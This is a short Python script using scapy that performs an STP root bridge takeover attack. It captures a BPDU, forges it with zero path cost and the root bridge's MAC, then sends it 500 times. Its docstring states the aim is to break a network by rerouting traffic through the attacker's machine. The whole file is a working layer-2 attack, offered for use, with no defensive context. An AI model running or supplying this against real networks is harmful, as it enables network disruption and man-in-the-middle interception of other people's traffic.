#!/usr/bin/env python3
# Import scapy
from scapy.all import *


def sniff_stp():

    """ This method is responsible to manipulate the STP protocol to change the root port and break a network by
    change the traffic path from the router to the machine running the script.This was possible by editing the
    original script from David Bombal """

    # Capture STP frame
    pkt = sniff(filter="ether dst 01:80:c2:00:00:00", count=1)

    # View STP
    pkt[0][2].show()

    # Block port to root switch
    # Set cost to root to zero
    pkt[0].pathcost = 0

    # Set bridge MAC to root bridge
    pkt[0].bridgemac = pkt[0].rootmac

    # Set port ID to 1
    pkt[0].portid = 1

    # Loop to send multiple BPDUs
    for i in range(0, 500):
        pkt[0].show()
        sendp(pkt[0], loop=0, verbose=1)
        time.sleep(1)


if __name__ == "__main__":
    sniff_stp()
